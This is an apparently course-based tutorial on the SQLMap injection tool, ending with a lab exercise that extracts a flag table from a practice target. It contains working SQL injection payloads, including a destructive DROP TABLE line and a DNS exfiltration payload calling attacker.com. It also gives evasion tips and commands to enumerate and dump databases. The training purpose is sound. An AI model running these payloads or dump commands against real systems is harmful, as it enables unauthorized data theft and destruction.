# 🛠️ SQLMap Essentials  
*Master the forbidden script of automation — SQLMap — to uncover, enumerate, and extract the hidden treasures locked behind SQL injection portals.*

> *“Let the tool do the incantations, while you prepare to harvest the arcane data that surfaces.”*

---

### 🛠️ Chapter 1: SQLMap Overview
- What It Is / Feature Categories
### 📦 Chapter 2: Installation
### 🗄️ Chapter 3: Supported Databases
### 💉 Chapter 4: Supported SQL Injection Types
- Boolean-based blind / Error-based / UNION query-based
- Stacked queries / Time-based blind / Inline queries / Out-of-band
### 📊 Chapter 5: SQLMap Output Description
- Log Messages
### 🌐 Chapter 6: Running SQLMap on an HTTP Request
- Curl Commands / GET-POST / Full Requests (-r) / Custom Requests / Custom Formats
### 🧪 Chapter 7: Exercises
- Exercise 1: POST-based SQLi (case2.php)
### 📋 Chapter 8: Command Reference

---

<details>
<summary><h2>🛠️ SQLMap Overview</h2></summary>

**SQLMap** is a free and open-source penetration testing tool written in **Python** that automates the process of detecting and exploiting **SQL injection (SQLi)** flaws. SQLMap has been continuously developed since **2006** and is still maintained today.

<table width="100%">
<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
<tr><td width="20%">

**`Roothulhu@htb[/htb]$`**

</td><td>

```bash
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```

</td></tr>
<tr><td colspan="2">

---

```
       ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.10.41#dev}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:55:56

[12:55:56] [INFO] testing connection to the target URL
[12:55:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[12:55:58] [INFO] testing if the target URL content is stable
[12:55:58] [INFO] target URL content is stable
[12:55:58] [INFO] testing if GET parameter 'id' is dynamic
[12:55:58] [INFO] confirming that GET parameter 'id' is dynamic
[12:55:59] [INFO] GET parameter 'id' is dynamic
[12:55:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:56:00] [INFO] testing for SQL injection on GET parameter 'id'
<...SNIP...>
```

</td></tr>
</table>

SQLMap ships with a powerful detection engine, many features, and a broad range of options and switches for fine-tuning its behavior.

<details>
<summary><h4>Feature Categories</h4></summary>

| Category | Category | Category |
|---|---|---|
| Target connection | Injection detection | Fingerprinting |
| Enumeration | Optimization | Protection detection and bypass (**tamper** scripts) |
| Database content retrieval | File system access | Execution of OS commands |

</details>

</details>

---

<details>
<summary><h2>📦 Installation</h2></summary>

SQLMap is **pre-installed** on the Pwnbox and on the majority of security-focused operating systems, and is found in many Linux distributions' repositories. On Debian it can be installed with:

<table width="100%">
<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
<tr><td width="20%">

**`Roothulhu@htb[/htb]$`**

</td><td>

```bash
sudo apt install sqlmap
```

</td></tr>
</table>

To install manually, clone the repository from the Linux terminal or Windows command line:

<table width="100%">
<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
<tr><td width="20%">

**`Roothulhu@htb[/htb]$`**

</td><td>

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

</td></tr>
</table>

After that, SQLMap can be run with:

<table width="100%">
<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
<tr><td width="20%">

**`Roothulhu@htb[/htb]$`**

</td><td>

```bash
python sqlmap.py
```

</td></tr>
</table>

</details>

---

<details>
<summary><h2>🗄️ Supported Databases</h2></summary>

SQLMap has the **largest DBMS support** of any SQL exploitation tool. It fully supports the following database management systems, and the team adds support for new ones periodically:

| | | | |
|---|---|---|---|
| MySQL | Oracle | PostgreSQL | Microsoft SQL Server |
| SQLite | IBM DB2 | Microsoft Access | Firebird |
| Sybase | SAP MaxDB | Informix | MariaDB |
| HSQLDB | CockroachDB | TiDB | MemSQL |
| H2 | MonetDB | Apache Derby | Amazon Redshift |
| Vertica | Mckoi | Presto | Altibase |
| MimerSQL | CrateDB | Greenplum | Drizzle |
| Apache Ignite | Cubrid | InterSystems Cache | IRIS |
| eXtremeDB | FrontBase | | |

</details>

---

<details>
<summary><h2>💉 Supported SQL Injection Types</h2></summary>

SQLMap is the only penetration testing tool that can properly detect and exploit **all known SQLi types**. The supported types are shown with the `sqlmap -hh` command:

<table width="100%">
<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
<tr><td width="20%">

**`Roothulhu@htb[/htb]$`**

</td><td>

```bash
sqlmap -hh
```

</td></tr>
<tr><td colspan="2">

---

```
...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
```

</td></tr>
</table>

The technique characters `BEUSTQ` map to the following. Note the default string is `"BEUSTQ"` — **out-of-band is not included by default**.

| Char | Technique | Speed / Note |
|---|---|---|
| **B** | Boolean-based blind | ~1 bit per request — **most common** type in web apps |
| **E** | Error-based | Fast — retrieves ~200-byte "chunks" per request |
| **U** | UNION query-based | **Fastest** — can pull a whole table in a single request |
| **S** | Stacked queries | Needs platform support — enables non-query statements + OS commands |
| **T** | Time-based blind | **Slowest** — inference from response delay |
| **Q** | Inline queries | Uncommon — requires the app to be written a certain way |

<details>
<summary><h3>Boolean-based blind</h3></summary>

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
AND 1=1
```

</td></tr>
</table>

SQLMap exploits Boolean-based blind SQLi through the differentiation of **TRUE** from **FALSE** query results, which yields **1 bit of information per request**. Extracting one character (≈ 1 byte) commonly requires **~7–8 requests**, depending on the character set and response stability. The differentiation compares server responses to decide whether the query returned TRUE or FALSE — ranging from fuzzy comparisons of raw response content, HTTP codes, page titles, filtered text, and other factors.

- **TRUE** results — responses with none or marginal difference from the regular server response.
- **FALSE** results — responses with substantial differences from the regular server response.

Boolean-based blind SQLi is considered the **most common SQLi type** in web applications.

</details>

<details>
<summary><h3>Error-based</h3></summary>

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
AND GTID_SUBSET(@@version,0)
```

</td></tr>
</table>

If the DBMS returns errors as part of the server response for database-related problems, there is a chance they can carry the results of requested queries. Specialized payloads for the current DBMS target functions that cause known misbehaviors. SQLMap has the most comprehensive list of such payloads and covers Error-based SQLi for the following DBMSes:

| | | |
|---|---|---|
| MySQL | PostgreSQL | Oracle |
| Microsoft SQL Server | Sybase | Vertica |
| IBM DB2 | Firebird | MonetDB |

Error-based SQLi is **faster than all other types except UNION query-based**, because it retrieves a limited amount (e.g. 200 bytes) of data — called "chunks" — per request.

</details>

<details>
<summary><h3>UNION query-based</h3></summary>

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
UNION ALL SELECT 1,@@version,3
```

</td></tr>
</table>

With `UNION`, it is generally possible to extend the original (vulnerable) query with the injected statement's results. If the original query results are rendered in the response, the attacker can read the additional injected results directly inside the page. This type is the **fastest** — in the ideal scenario the attacker pulls the whole table of interest with a single request.

</details>

<details>
<summary><h3>Stacked queries</h3></summary>

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
; DROP TABLE users
```

</td></tr>
</table>

Stacking queries — also known as **"piggy-backing"** — injects additional SQL statements after the vulnerable one. When non-query statements must run (e.g. `INSERT`, `UPDATE`, `DELETE`), stacking must be supported by the vulnerable platform (**Microsoft SQL Server** and **PostgreSQL** support it by default). SQLMap can use such vulnerabilities to run non-query statements for advanced features (e.g. OS command execution) and to retrieve data similarly to time-based blind SQLi.

</details>

<details>
<summary><h3>Time-based blind</h3></summary>

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

</td></tr>
</table>

The principle is the same as Boolean-based blind SQLi, but here the **response time** is the source for the TRUE/FALSE differentiation.

- **TRUE** — a noticeable difference in response time compared to the regular response.
- **FALSE** — a response time indistinguishable from regular response times.

Time-based blind SQLi is considerably **slower** than Boolean-based, since TRUE queries delay the server response. It is used when Boolean-based blind SQLi is not applicable — for example when the vulnerable statement is a non-query (`INSERT`/`UPDATE`/`DELETE`) run as auxiliary functionality with no effect on page rendering, so Boolean-based would not work.

</details>

<details>
<summary><h3>Inline queries</h3></summary>

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
SELECT (SELECT @@version) from
```

</td></tr>
</table>

This type embeds a query within the original query. It is **uncommon**, as it needs the vulnerable web app to be written in a certain way — but SQLMap supports it as well.

</details>

<details>
<summary><h3>Out-of-band</h3></summary>

<table width="100%">
<tr><td> 🗄️ <b>SQL</b> </td></tr>
<tr><td>

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

</td></tr>
</table>

One of the **most advanced** SQLi types, used when all other types are either unsupported by the vulnerable web app or too slow (e.g. time-based blind). SQLMap supports out-of-band SQLi through **"DNS exfiltration."**

By running SQLMap on the DNS server for a domain under control (e.g. `.attacker.com`), it forces the target server to request non-existent subdomains (e.g. `foo.attacker.com`), where `foo` is the SQL response to receive. SQLMap collects these erroring DNS requests, extracts the `foo` part, and reconstructs the full SQL response.

</details>

</details>

---

<details>
<summary><h2>📊 SQLMap Output Description</h2></summary>

SQLMap's scan output is crucial to understand — it guides the automated process, shows exactly which vulnerability type is being exploited (useful for reporting), and lets us pivot to **manual exploitation** once SQLMap pins down the injection type and vulnerable parameter.

<details>
<summary><h3>Log Messages</h3></summary>

The most common messages seen during a scan, with what each one means:

| Log Message | Meaning |
|---|---|
| `target URL content is stable` | No major changes between identical requests → easier to spot SQLi-caused differences. SQLMap can also filter "noise" from unstable targets. |
| `GET parameter 'id' appears to be dynamic` | Changing the value changes the response → parameter likely linked to a DB. **Static** = value not processed in this context. |
| `heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')` | An invalid value (e.g. `?id=1",)..))'`) triggered a DBMS error → possible SQLi + possible MySQL. **Indication, not proof** — confirmed in later run. |
| `heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks` | Bonus fast heuristic — SQLMap flags potential XSS too. Handy in large-scale parameter sweeps. |
| `it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? Y/n` | Clear DBMS indication → narrow payloads to just that DBMS (faster). |
| `for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? Y/n` | Extend tests for the detected DBMS — run **all** its payloads vs only top payloads. |
| `reflective value(s) found and filtering out` | Payload parts echoed back in the response (junk). SQLMap filters them before comparing page content. |
| `GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")` | Appears injectable (false-positive still possible — final logic checks remove them). `--string="luther"` = constant string used to tell **TRUE** from **FALSE**, so no advanced comparison needed. |
| `time-based comparison requires a larger statistical model, please wait........... (done)` | Collects enough regular response times to statistically distinguish deliberate delays — works even on high-latency networks. |
| `automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found` | UNION needs many requests — capped at **10** normally, but extended when another technique is already found (higher success odds). |
| `'ORDER BY' technique appears to be usable. ...` | `ORDER BY` heuristic works → SQLMap finds the UNION column count fast via **binary search**. Depends on the affected table. |
| `GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? y/N` | **Confirmed vulnerable.** Usually one injection point is enough; keep going to report all vulnerable parameters. |
| `sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:` | Lists each injection point's type, title, and payloads — final proof. Only **provably exploitable** findings are listed. |
| `fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'` | Output/session dir per target. Session files are reused on future runs to **reduce required requests**. |

</details>

</details>

---

<details>
<summary><h2>🌐 Running SQLMap on an HTTP Request</h2></summary>

SQLMap has many options and switches to set up the HTTP request correctly before use. Simple mistakes — missing cookie values, an over-long command line, or malformed POST data — prevent correct detection and exploitation.

When feeding data to SQLMap there must be either a **parameter value** to assess, or switches for automatic parameter finding (`--crawl`, `--forms`, `-g`).

<details>
<summary><h3>Curl Commands</h3></summary>

Easiest way to set up the request: **Copy as cURL** from the Network panel of Chrome/Edge/Firefox DevTools. Paste it, then change `curl` → `sqlmap` — SQLMap accepts the identical command:

<table width="100%">
<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
<tr><td width="20%">

**`Roothulhu@htb[/htb]$`**

</td><td>

```bash
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

</td></tr>
</table>

</details>

<details>
<summary><h3>GET / POST Requests</h3></summary>

GET parameters go through `-u`/`--url`. POST data goes through `--data` — all its parameters get tested:

<table width="100%">
<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
<tr><td width="20%">

**`Roothulhu@htb[/htb]$`**

</td><td>

```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

</td></tr>
</table>

To narrow testing to one parameter, use `-p uid`. Or mark the injection point inline with `*`:

<table width="100%">
<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
<tr><td width="20%">

**`Roothulhu@htb[/htb]$`**

</td><td>

```bash
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

</td></tr>
</table>

</details>

<details>
<summary><h3>Full HTTP Requests (-r)</h3></summary>

For complex requests (many headers, long POST body), save the whole HTTP request to a **request file** and pass it with `-r`. Capture it from a proxy like **Burp** (right-click → *Copy to file*) or from the browser (*Copy > Copy Request Headers*).

<table width="100%">
<tr><td> 📄 <b>req.txt — captured HTTP request</b> </td></tr>
<tr><td>

```http
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```

</td></tr>
</table>

<table width="100%">
<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
<tr><td width="20%">

**`Roothulhu@htb[/htb]$`**

</td><td>

```bash
sqlmap -r req.txt
```

</td></tr>
<tr><td colspan="2">

---

```
[14:32:59] [INFO] parsing HTTP request from 'req.txt'
[14:32:59] [INFO] testing connection to the target URL
[14:32:59] [INFO] testing if the target URL content is stable
[14:33:00] [INFO] target URL content is stable
```

</td></tr>
</table>

> **TIP:** As with `--data`, mark the parameter to inject inside the request file with an asterisk — e.g. `/?id=*`.

</details>

<details>
<summary><h3>Custom Requests</h3></summary>

Fine-tune the request with dedicated switches:

| Switch | Purpose |
|---|---|
| `--cookie='PHPSESSID=...'` | Set the session cookie value |
| `-H/--header='Cookie:PHPSESSID=...'` | Same effect via a raw header |
| `--host` / `--referer` / `-A`/`--user-agent` | Set those HTTP header values |
| `--random-agent` | Pick a random real-browser User-Agent — **important**: many defenses drop the default `sqlmap/...` UA |
| `--mobile` | Imitate a smartphone User-Agent |
| `--method PUT` | Use an alternative HTTP method (other than GET/POST) |

<table width="100%">
<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
<tr><td width="20%">

**`Roothulhu@htb[/htb]$`**

</td><td>

```bash
sqlmap -u www.target.com --data='id=1' --method PUT
```

</td></tr>
</table>

By default SQLMap targets only HTTP parameters, but any part of the request can be tested — place the `*` injection mark after a header value, e.g. `--cookie="id=1*"`.

</details>

<details>
<summary><h3>Custom Formats (JSON / XML)</h3></summary>

Besides form-data (`id=1`), SQLMap supports **JSON** (`{"id":1}`) and **XML** (`<element><id>1</id></element>`) bodies, parsed in a relaxed manner. Short bodies → `--data`; complex/long bodies → `-r` with a request file:

<table width="100%">
<tr><td> 📄 <b>req.txt — JSON body</b> </td></tr>
<tr><td>

```http
HTTP / HTTP/1.0
Host: www.example.com

{
  "data": [{
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example"
    },
    "relationships": {
      "author": { "data": {"id": "42", "type": "user"} }
    }
  }]
}
```

</td></tr>
</table>

<table width="100%">
<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
<tr><td width="20%">

**`Roothulhu@htb[/htb]$`**

</td><td>

```bash
sqlmap -r req.txt
```

</td></tr>
<tr><td colspan="2">

---

```
[00:03:44] [INFO] parsing HTTP request from 'req.txt'
JSON data found in HTTP body. Do you want to process it? [Y/n/q]
[00:03:45] [INFO] testing connection to the target URL
[00:03:46] [INFO] testing if HTTP parameter 'JSON type' is dynamic
[00:03:46] [WARNING] HTTP parameter 'JSON type' does not appear to be dynamic
```

</td></tr>
</table>

SQLMap auto-detects the JSON body and prompts to process it.

</details>

</details>

---

<details>
<summary><h2>🧪 Exercises</h2></summary>

<details>
<summary><h3>Exercise 1: POST-based SQLi (case2.php)</h3></summary>

> **Goal:** retrieve the contents of table `flag2` (Case #2) from a POST parameter vulnerable to SQL injection.

**Target:** `http://<target>:<port>/case2.php` — POST parameter `id`.

**1. Capture the original request** — DevTools (or Burp) *Copy as cURL* dumps the full browser request:

<table width="100%">
<tr><td> 📄 <b>curl — DevTools export</b> </td></tr>
<tr><td>

```bash
curl 'http://<target>:<port>/case2.php' \
  --compressed \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: http://<target>:<port>/case2.php' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://<target>:<port>' \
  -H 'DNT: 1' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  --data-raw 'id=1'
```

</td></tr>
</table>

Most of this is browser chrome. sqlmap only needs the **method, the body, and whatever the app actually requires** — strip the rest so the scan is clean and fast:

| Part | Keep? | Why |
|---|---|---|
| URL + `--data-raw 'id=1'` | ✅ → `-u` + `--data` | Target and the injectable POST body — the whole point of the test. |
| `-X POST` | ✅ (implicit) | Sets the method; sqlmap auto-selects POST once `--data` is present. |
| `-H 'Content-Type: …urlencoded'` | ✅ safe to drop | sqlmap's default for `--data` is form-urlencoded, so the server parses it either way. |
| `-H 'Referer: …'` | ⚠️ optional | Keep (`--referer`) only if the app gates on it. Not needed here. |
| `-H 'User-Agent: …'` | ❌ | sqlmap sends its own UA; use `--random-agent` if the app filters by UA. |
| `Accept*`, `Origin`, `DNT`, `Upgrade-Insecure-Requests`, `Priority`, `Connection`, `--compressed` | ❌ | Browser content-negotiation / transport noise — zero effect on injection. |

Everything collapses to target + body + `--batch` (non-interactive):

**2. Detect** — run the minimal equivalent:

<table width="100%">
<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
<tr><td width="20%">

**`Roothulhu@htb[/htb]$`**

</td><td>

```bash
sqlmap -u 'http://<target>:<port>/case2.php' --data='id=1' --batch
```

</td></tr>
<tr><td colspan="2">

---

```
[INFO] POST parameter 'id' appears to be dynamic
[INFO] heuristic (basic) test shows that POST parameter 'id' might be injectable (possible DBMS: 'MySQL')
[INFO] POST parameter 'id' is 'MySQL >= 5.1 AND error-based ... (EXTRACTVALUE)' injectable
[INFO] POST parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[INFO] target URL appears to have 9 columns in query
[INFO] POST parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
---
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
```

</td></tr>
</table>

Four injection types confirmed on `id`: **boolean-based**, **error-based (EXTRACTVALUE)**, **time-based blind (SLEEP)**, and **UNION (9 columns)**.

**3. Enumerate** — current database + tables (session resumes, no re-detection):

<table width="100%">
<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
<tr><td width="20%">

**`Roothulhu@htb[/htb]$`**

</td><td>

```bash
sqlmap -u 'http://<target>:<port>/case2.php' --data='id=1' --batch --current-db --tables
```

</td></tr>
<tr><td colspan="2">

---

```
current database: 'testdb'

Database: testdb
[2 tables]
+---------+
| flag2   |
| users   |
+---------+
```

</td></tr>
</table>

> **NOTE:** `potential permission problems detected ('command denied')` — the DB user can't list all schemas, but `testdb` (the current DB) enumerates fine. Target table `flag2` is present.

**4. Dump `flag2`:**

<table width="100%">
<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
<tr><td width="20%">

**`Roothulhu@htb[/htb]$`**

</td><td>

```bash
sqlmap -u 'http://<target>:<port>/case2.php' --data='id=1' --batch -D testdb -T flag2 --dump
```

</td></tr>
<tr><td colspan="2">

---

```
Database: testdb
Table: flag2
[1 entry]
+----+----------------------------------------+
| id | content                                |
+----+----------------------------------------+
| 1  | HTB{700_much_c0n6r475_0n_p057_r3qu357} |
+----+----------------------------------------+

[INFO] table 'testdb.flag2' dumped to CSV file '.../output/<target>/dump/testdb/flag2.csv'
```

</td></tr>
</table>

| Field | Value |
|---|---|
| Vulnerable parameter | `id` (POST) |
| DBMS | MySQL ≥ 5.1 (MariaDB fork), Debian 10 / Apache 2.4.38 |
| Injection types | boolean / error (EXTRACTVALUE) / time-based (SLEEP) / UNION (9 cols) |
| Database | `testdb` |
| **Flag** | `HTB{700_much_c0n6r475_0n_p057_r3qu357}` |

> **TIP:** The stored session (`~/.local/share/sqlmap/output/<target>/`) lets steps 3–4 skip re-detection — each run resumes the injection points instantly.

</details>

</details>

---

<details>
<summary><h2>📋 Command Reference</h2></summary>

Quick reference of the commands covered so far — this table will grow as more commands are added.

| Command | Utility |
|---|---|
| `python sqlmap.py -u '<url>'` | Run SQLMap against a target URL |
| `sudo apt install sqlmap` | Install SQLMap (Debian) |
| `git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev` | Install SQLMap manually (clone repo) |
| `python sqlmap.py` | Run SQLMap from a manual install |
| `sqlmap -hh` | Full help — lists all options and techniques |
| `--technique=BEUSTQ` | Select SQLi techniques (default `BEUSTQ`) |
| `sqlmap -u '<url>'` | Test a GET parameter |
| `sqlmap '<url>' --data 'a=1&b=2'` | Test POST data parameters |
| `-p <param>` | Narrow testing to a specific parameter |
| `--data 'uid=1*'` | Mark injection point inline with `*` |
| `sqlmap -r req.txt` | Load a full HTTP request from a file (mark with `*`) |
| `--cookie='PHPSESSID=...'` | Set the session cookie |
| `-H/--header='Cookie:...'` | Set a raw HTTP header |
| `--host` / `--referer` / `-A` | Set Host / Referer / User-Agent headers |
| `--random-agent` | Use a random real-browser User-Agent (evades default-UA drops) |
| `--mobile` | Imitate a smartphone User-Agent |
| `--method PUT` | Use an alternative HTTP method |
| `--crawl` / `--forms` / `-g` | Auto-find parameters (crawl / parse forms / Google dork) |
| `--batch` | Auto-answer all prompts with defaults (non-interactive) |
| `--current-db` | Fetch the current database name |
| `--dbs` | List all databases |
| `-D <db> --tables` | List tables in a database |
| `-D <db> -T <table> --columns` | List columns in a table |
| `-D <db> -T <table> --dump` | Dump a table's contents (→ CSV under `output/.../dump/`) |

</details>
